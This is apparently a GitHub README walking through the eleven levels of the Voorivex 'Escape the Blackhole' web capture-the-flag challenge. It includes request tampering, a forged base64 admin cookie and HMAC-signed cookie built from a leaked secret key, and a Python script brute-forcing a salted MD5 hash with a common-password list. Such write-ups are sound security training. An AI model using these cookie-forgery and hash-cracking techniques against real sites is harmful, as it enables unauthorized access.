# Voorivex-Challange-Blackhole
This repo provides solution to Voorivex challenge Escape the Blackhole

- ### Level 1

```text
1.crack the hash : f62e05eafec3231205788cba3ef91d54
2.It is : interstellar
3.go to : https://talent.voorivex.academy/interstellar/
```

- ### Level 2

```text
1.Send a post request to this address : https://talent.voorivex.academy/interstellar/
with parameters like this: action=land&city=moscow
2.You will get : "/gC6qDkHV"
3.Go to : https://talent.voorivex.academy/gC6qDkHV/
```

- ### Level 3

```text
1.Change the origin to anything and send the request
2.Send this command: curl https://talent.voorivex.academy/gC6qDkHV/ --header "origin: test.com"
3.You will get: "/R3hYMMjH"
4.Go to : https://talent.voorivex.academy/R3hYMMjH/
```

- ### Level 4

```text
1.Change local host file to : 127.0.0.1 andromeda
2.Run a simple python http server with : python3 -m http.server 80
3.In browser go to : http://andromeda
4.Open console and put the following script in it (set browser proxy to send requests to burp)
```

```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        console.log(xhr.responseText);
    }
}
xhr.open('PUT', 'https://talent.voorivex.academy/R3hYMMjH/', true);
xhr.send(null);
```

```text
5.In burp you see an OPTIONS request, the flag is in the response : "/NBeT27bk"
6.Go to : https://talent.voorivex.academy/NBeT27bk/
```

- ### Level 5

```text
1.Send a simple GET request to https://talent.voorivex.academy/NBeT27bk/
2.Response has so many spaces, look at the end, the flag is : /KnYN4Ike
3.Go to : https://talent.voorivex.academy/KnYN4Ike
```

- ### Level 6

```text
1.View page source and take the binary numbers, split them into 8 characters blocks
like this : 00110011 00111000 00101110 00111000 00111000 00110011 00110000 00110110 00110100 00111001 00101100 00101101 00110111 00110111 00101110 00110000 00110001 00110110 00110010 00110111 00111000 00110110
2.Convert it to ASCII and it becomes: 38.8830649,-77.0162786
3.look at page javascript, there is function called `verifyCoordinates`
4.In the browser console call this function with the cordinates found in step 2
5.Watch the request in burp, it gives you the flag: "/kPEL1eTA"
6.Go to: https://talent.voorivex.academy/kPEL1eTA
```

- ### Level 7

```text
1.Check the cookies, there is a cookie -> dXNlcgQ%3D
2.URL Decode and then b64decode in browser console like this
```

```javascript
>> atob('dXNlcgQ=')
<- "user\u0004"
```

```text
3.There is a relation between `user` number of characters (4) and `\u0004`
4.To become `admin` (5 character), we should send `admin\u0005`
5.In browser console type:
```

```javascript
>> btoa('admin\u0005')
<- "YWRtaW4F"
```

```text
6.Put `YWRtaW4F` in cookie `role` and send it, you will get : "/jKD7AlXH"
7.Go to : https://talent.voorivex.academy/jKD7AlXH
```

- ### Level 8

```text
1.You have two cookies this time
- role
- secure_role

2.The `role` cookie works as previous level, but `secure_role` is combination of
user.LONGHASH, there is also a javascript in the page which shows how this hash is generated

3.We need the `secretKey` in order to make a hash for user admin

4.Sending any arbitary data in `secure_role` cookie, generates an error that shows the secret key : `int3rstellarKey`

5.Use this key and call the function `signString` in browser console like this : signString('admin','int3rstellarKey')
it gives you the hash for user admin -> ab5479d103913c42eeb210220e74677bb48f53fbb7c7dae4ad62335bd51e85cc

6.send the request this time like this :
- `role` cookie should be : `YWRtaW4F` (same as previous level)
- `secure_role` cookie should be : `YWRtaW4=.ab5479d103913c42eeb210220e74677bb48f53fbb7c7dae4ad62335bd51e85cc`
you will get the flag : `"/dUwsDlDr"`

7.Go to : https://talent.voorivex.academy/dUwsDlDr
```

- ### Level 9

```text
1.See the page source, it says send `?showme` as parameter, do it and you will get a php code:
```

```php
<?php
error_reporting(0);
require 'salt.php';

if (array_key_exists('showme', $_GET)) {
    show_source('index.php');
    die();
}

function generateHashWithSalt($password, $salt)
{
    $combined = $password . '<>' . $salt;
    $hashedPassword = md5($combined);

    return $hashedPassword;
}

if (isset($_GET['password'])) {
    // https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt
    if (generateHashWithSalt($_GET['password'], $salt) === '947f7730925f722c020c241d10fd930e') {
        echo getenv('LEVEL_10');
        die();
    } else {
        echo 'Invalid password!';
        die();
    }
}
?>
```

```text
2.You should find the correct salt and password to reach to the hash
- for password list download the `10k-most-common.txt` from the given link in comment
- for salt, look at the page sentence : `challenges is the salt . . .`, so the salt is the word `challenges`

3.Write a python code to calculate the hash for you :
```

```python
import hashlib


with open('wordlist.txt','r') as f:
    password_lines = f.readlines()


def generate_md5_hash(password, salt):
    md5_hash = hashlib.md5()
    combined = f'{password}<>{salt}'
    md5_hash.update(combined.encode('utf-8'))
    hashedPassword =md5_hash.hexdigest()
    return hashedPassword

for password in password_lines:
    striped_password = password.strip()
    result = generate_md5_hash(striped_password,'challenges')
    if result.strip() == '947f7730925f722c020c241d10fd930e':
        print(f'found password : {striped_password}')
        break
```

```text
the password is `space`

4.Send the password as parameter to get the flag: https://talent.voorivex.academy/dUwsDlDr/?password=space
you wil get : "/rqp2yOxi"

5.Go to : https://talent.voorivex.academy/rqp2yOxi/
```

- ### Level 10

```text
1.Send this request : https://talent.voorivex.academy/rqp2yOxi/?pass[]

2.You will get the flag in error page : /udsWoshd

3.Go to : https://talent.voorivex.academy/udsWoshd
```


- ### Level 11

```text
1.See page source and js, it uses websocket messages

2.In burp check websocket, it send a message to server like this:
{"level":"/udsWoshd","data":{"next":false}}

3.Send this message to server :
{"level":"/udsWoshd","data":{"next":true}}

4.It gives you the flag: "/rNNVU329"

5.Go to : https://talent.voorivex.academy/rNNVU329
```






















